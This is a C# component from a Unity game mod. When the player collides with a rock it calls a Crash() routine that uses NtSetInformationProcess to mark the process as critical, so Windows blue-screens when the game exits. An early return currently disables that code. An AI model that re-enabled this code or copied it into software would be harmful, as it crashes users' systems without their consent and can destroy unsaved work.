using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using UnityEngine;

namespace ArkoseSurprise;

public class RockCrash : MonoBehaviour
{
	private void OnCollisionEnter(Collision other)
	{
		ArkoseSurprise.Instance.ModHelper.Console.WriteLine($"hit {other}");
		if (other.rigidbody.CompareTag("Player")) Crash();
	}


	// https://codingvision.net/c-make-a-critical-process-bsod-if-killed
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	private static void Crash()
	{
		ArkoseSurprise.Instance.ModHelper.Console.WriteLine("crash");
		return;

		int isCritical = 1; // we want this to be a Critical Process
		int BreakOnTermination = 0x1D; // value for BreakOnTermination (flag)

		Process.EnterDebugMode(); //acquire Debug Privileges

		// setting the BreakOnTermination = 1 for the current process
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
	}
}
